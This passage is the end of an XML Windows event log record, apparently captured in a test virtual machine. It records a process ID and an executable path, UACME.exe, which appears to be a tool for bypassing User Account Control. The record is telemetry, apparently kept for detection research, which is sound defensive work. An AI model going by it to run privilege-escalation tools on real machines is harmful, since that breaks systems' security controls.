      <Data Name="ProcessGuid">{747F3D96-B07D-5D46-0000-00103C8C0F04}</Data>
      <Data Name="ProcessId">7588</Data>
      <Data Name="Image">C:\Users\IEUser\Desktop\UACME.exe</Data>
    </EventData>
  </Event>
</root>